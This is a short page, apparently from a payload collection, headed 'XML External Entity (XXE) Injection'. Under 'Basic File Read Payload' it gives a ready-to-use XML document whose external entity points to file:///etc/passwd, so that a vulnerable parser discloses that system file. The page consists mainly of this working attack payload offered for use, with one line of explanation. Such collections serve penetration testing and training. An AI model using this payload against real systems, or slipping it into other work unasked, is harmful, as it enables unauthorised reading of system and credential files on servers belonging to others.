# Payloads - XML External Entity (XXE) Injection

## 1. Basic File Read Payload
This payload defines an external entity (`xxe`) pointing to the local system file `/etc/passwd` and evaluates it within the root element.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
